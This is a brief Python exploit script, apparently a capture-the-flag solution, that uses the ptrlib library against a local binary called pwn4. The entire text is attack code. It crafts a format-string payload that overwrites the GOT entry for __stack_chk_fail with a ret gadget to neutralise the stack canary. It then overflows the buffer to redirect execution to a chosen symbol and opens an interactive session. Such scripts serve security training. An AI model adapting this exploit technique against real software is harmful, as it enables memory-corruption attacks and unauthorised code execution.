from ptrlib import *

elf = ELF("./pwn4")
sock = Process("./pwn4")

rop_ret = 0x0804838a
writes = {
    elf.got("__stack_chk_fail"): rop_ret
}

payload = b''
payload += fsb(
    pos = 7,
    writes = writes,
    bs = 1,
    written = 0
)
payload += b'A' * (0x90 - len(payload))
payload += p32(elf.symbol("__"))
sock.sendline(payload)
sock.interactive()
